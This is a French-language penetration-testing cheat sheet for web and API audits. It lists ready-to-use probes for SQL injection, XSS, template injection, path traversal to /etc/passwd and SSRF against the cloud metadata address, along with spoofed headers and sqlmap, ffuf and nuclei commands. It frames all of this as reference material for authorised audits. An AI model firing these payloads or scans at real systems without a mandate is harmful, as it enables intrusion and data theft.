---
title: Cheat sheet - Payloads et commandes
tags:
  - offensif/audit-web-api
  - pentest
  - cheatsheet
  - web
  - api
---

# Cheat sheet — Payloads et commandes courantes

> **Note.** Objectif
> Aide-mémoire des payloads et commandes les plus fréquemment utilisés en audit web/API, à valider systématiquement dans le contexte de la cible et du mandat d'audit avant emploi.

## A collection  payloads

https://github.com/1N3/IntruderPayloads
https://www.yeswehack.com/fr/learn-bug-bounty/web-application-firewall-bypass
## Injection SQL — détection rapide

```
'
''
"
1 OR 1=1
1' OR '1'='1
1' AND SLEEP(5)-- -
1; WAITFOR DELAY '0:0:5'--
' UNION SELECT NULL,NULL,NULL-- -
```

## XSS — détection rapide

```html
<script>alert(document.domain)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

## SSTI — détection par moteur

```
{{7*7}}                     → Jinja2, Twig (49 attendu)
${7*7}                      → FreeMarker (49 attendu)
#set($x=7*7)$x              → Velocity (49 attendu)
${{7*7}}{{7*'7'}}           → différenciation XSS / SSTI
```

## Path traversal / LFI

```
../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..\..\..\..\windows\win.ini
```

## SSRF — cibles de test

```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
```

## En-têtes HTTP utiles en test

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: exemple.tld
X-Original-URL: /admin
X-Rewrite-URL: /admin
Referer: https://exemple.tld/
Origin: https://attaquant.tld
```

## Commandes de reconnaissance rapide

```bash
subfinder -d exemple.tld | httpx -title -status-code -tech-detect
ffuf -u https://exemple.tld/FUZZ -w common.txt -mc 200,301,302,403
nuclei -u https://exemple.tld -severity medium,high,critical
sqlmap -u "https://exemple.tld/page?id=1" --batch --level=3 --risk=2
```

## Commandes d'analyse de JWT

```bash
python3 jwt_tool.py <jeton> -T
python3 jwt_tool.py <jeton> -X a
```

> **Note.** Cadre d'usage
> Aide-mémoire de commandes, pas une autorisation d'usage : chaque payload ne doit être exécuté que dans le périmètre couvert par un mandat d'audit écrit — voir
> [Preambule-et-cadre-legal-Audit-Web-API](../00-Methodologie/Preambule-et-cadre-legal-Audit-Web-API.md).

## Voir également

- [Injection-SQL](../02-Vulnerabilites-web-classiques/Injection-SQL.md)
- [Cross-Site-Scripting-XSS](../02-Vulnerabilites-web-classiques/Cross-Site-Scripting-XSS.md)
- [Deserialisation-et-injection-de-gabarits-SSTI](../02-Vulnerabilites-web-classiques/Deserialisation-et-injection-de-gabarits-SSTI.md)
- [Audit-Web-et-API-MOC](../Audit-Web-et-API-MOC.md)
